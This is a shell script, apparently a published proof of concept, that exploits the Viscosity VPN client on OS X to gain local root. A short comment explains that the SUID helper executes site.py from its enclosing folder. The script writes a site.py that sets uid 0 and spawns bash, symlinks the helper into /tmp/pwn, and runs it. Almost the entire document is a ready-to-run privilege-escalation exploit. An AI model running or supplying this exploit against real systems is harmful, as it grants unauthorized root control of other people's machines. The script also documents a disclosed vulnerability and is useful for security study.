#!/bin/sh
#
##########################
#       Viscatory        #
#                        #
#         zx2c4          #
##########################
#
# After the hullabaloo from the Tunnelblick local root, savy Mac users
# began defending Viscosity, another OS X VPN client. They figured, since
# they spent money on Viscosity, surely it would be better designed than
# the free open-source alternative.
#
# Unfortunately, this exploit took all of 2 minutes to find. DTrace for
# the win. Here, the SUID helper will execute site.py in its enclosing
# folder. A simple symlink, and we have root.
# 
# greets to jono
#
# Source: http://git.zx2c4.com/Viscatory/tree/viscatory.sh

echo \"[+] Crafting payload.\"
mkdir -p -v /tmp/pwn
cat > /tmp/pwn/site.py <<_EOF
import os
print \"[+] Cleaning up.\"
os.system(\"rm -rvf /tmp/pwn\")
print \"[+] Getting root.\"
os.setuid(0)
os.setgid(0)
os.execl(\"/bin/bash\", \"bash\")
_EOF
echo \"[+] Making symlink.\"
ln -s -f -v /Applications/Viscosity.app/Contents/Resources/ViscosityHelper /tmp/pwn/root
echo \"[+] Running vulnerable SUID helper.\"
exec /tmp/pwn/root